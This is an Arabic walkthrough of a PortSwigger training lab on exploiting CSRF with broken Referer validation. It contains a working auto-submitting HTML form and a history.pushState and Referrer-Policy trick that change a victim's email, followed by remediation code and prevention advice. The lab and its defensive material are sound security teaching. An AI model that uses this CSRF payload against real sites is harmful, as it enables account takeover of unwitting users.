# Lab: CSRF with broken Referer validation

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يتحقق من **Referer header**، لكن آلية التحقق **معطوبة** حيث يقبل أي Referer طالما **يحتوي على domain المطلوب في أي مكان** (حتى في query string).

**الحساب:** `wiener:peter`

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم آلية التحقق

- سجل الدخول بـ `wiener:peter`
- اذهب إلى **My account** → **Update email**
- اعترض الطلب في Burp:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Referer: https://YOUR-LAB-ID.web-security-academy.net/my-account
Cookie: session=YOUR-SESSION-COOKIE

email=test@test.com
```

### الخطوة 2: اختبار آلية التحقق من Referer

في Repeater:

| التغيير | النتيجة |
|---------|---------|
| تغيير `Referer` إلى domain مختلف (مثل `https://evil.com`) | ❌ الطلب يرفض |
| إضافة domain الأصلي في query string: `https://evil.com?YOUR-LAB-ID.web-security-academy.net` | ✅ **الطلب ينجح!** |

**الاستنتاج:** الخادم يتحقق فقط من أن `Referer` **يحتوي على domain الأصلي** في أي مكان (حتى في query string).

### الخطوة 3: فهم كيف نجعل المتصفح يرسل Referer كاملاً

المتصفحات الحديثة قد **تحذف query string** من Referer لأسباب أمنية. نحتاج إلى إجبار المتصفح على إرسال الـ Referer كاملاً باستخدام:

```
Referrer-Policy: unsafe-url
```

نضيف هذا الهيدر في صفحة الهجوم.

### الخطوة 4: بناء HTML للهجوم

نستخدم `history.pushState()` لجعل الـ Referer يحتوي على domain الأصلي في query string:

```html
<script>
    history.pushState('', '', '/?YOUR-LAB-ID.web-security-academy.net')
</script>

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim%40attacker.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

### الخطوة 5: إضافة Referrer-Policy في الـ Head

في Exploit Server، أضف هذا الهيدر في حقل **Head**:

```
Referrer-Policy: unsafe-url
```

### الخطوة 6: الهيكل النهائي لصفحة الهجوم

**Body:**
```html
<script>
    history.pushState('', '', '/?YOUR-LAB-ID.web-security-academy.net')
</script>

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim%40attacker.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

**Head (في حقل Head في Exploit Server):**
```
Referrer-Policy: unsafe-url
```

### الخطوة 7: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Head**، اكتب: `Referrer-Policy: unsafe-url`
- في حقل **Body**، الصق الـ HTML
- استبدل `YOUR-LAB-ID` بمعرف مختبرك
- اضغط **Store**

### الخطوة 8: تجربة الهجوم على نفسك

- اضغط **View exploit**
- ارجع إلى **My account** → لاحظ أن بريدك تغير ✅

### الخطوة 9: تسليم الهجوم للضحية

- غير البريد الإلكتروني إلى قيمة مختلفة
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 10: حل المختبر

بعد بضع ثوانٍ، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **كيف يتحقق الخادم من Referer؟** | يرفض الطلبات التي لا تحتوي على domain الأصلي في Referer |
| **أين الثغرة؟** | الخادم يقبل أي Referer **يحتوي** على domain الأصلي (حتى في query string) |
| **كيف نستغل هذا؟** | نجعل Referer = `https://evil.com?LAB-ID.web-security-academy.net` |
| **لماذا نحتاج `history.pushState()`؟** | لتعديل عنوان الصفحة الحالية ليحتوي على domain الأصلي في query string |
| **لماذا نحتاج `Referrer-Policy: unsafe-url`؟** | لمنع المتصفح من حذف query string من Referer |

---

## 📊 شرح آلية `history.pushState()`

```javascript
history.pushState('', '', '/?YOUR-LAB-ID.web-security-academy.net')
```

| قبل التنفيذ | بعد التنفيذ |
|-------------|--------------|
| صفحتنا على: `https://exploit-server.net/exploit` | الصفحة لا تزال نفسها لكن عنوانها أصبح: `https://exploit-server.net/?LAB-ID` |

عند إرسال الفورم، الـ Referer سيكون:
```
https://exploit-server.net/?YOUR-LAB-ID.web-security-academy.net
```
وهذا يحتوي على domain المطلوب → الخادم يقبله ✅

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق من وجود domain الأصلي **في أي مكان** في Referer، بدلاً من التحقق من أن الـ Referer يبدأ به أو أن hostname يطابق بالكامل.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
export default function handler(req, res) {
  const { email } = req.body;
  const { sessionId } = req.cookies;
  const referer = req.headers.referer;
  
  // خطأ: يتحقق فقط من وجود domain في أي مكان
  if (!referer || !referer.includes(req.headers.host)) {
    return res.status(403).send('Invalid Referer');
  }
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
export default function handler(req, res) {
  const { email, csrfToken } = req.body;
  const { sessionId } = req.cookies;
  const referer = req.headers.referer;
  
  // التصحيح: التحقق من أن Referer يبدأ بالـ domain الصحيح
  if (!referer) {
    return res.status(403).send('Referer header missing');
  }
  
  const url = new URL(referer);
  if (url.hostname !== req.headers.host) {
    return res.status(403).send('Invalid Referer');
  }
  
  // طبقة دفاع إضافية: CSRF Token
  if (!verifyCsrfToken(sessionId, csrfToken)) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

**الخلاصة:** 
1. تحقق من أن hostname في Referer **يطابق بالكامل**، وليس فقط يحتوي على domain
2. استخدم CSRF Tokens كحماية أساسية

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **التحقق الكامل من Referer:** تأكد أن `hostname` يطابق، وليس فقط `includes()`.
2. **لا تعتمد على Referer فقط:** يمكن تزويره أو حذفه.
3. **استخدام CSRF Tokens:** الحماية الأساسية.
4. **التحقق من Origin أيضاً:** كطبقة دفاع إضافية.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
- [Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
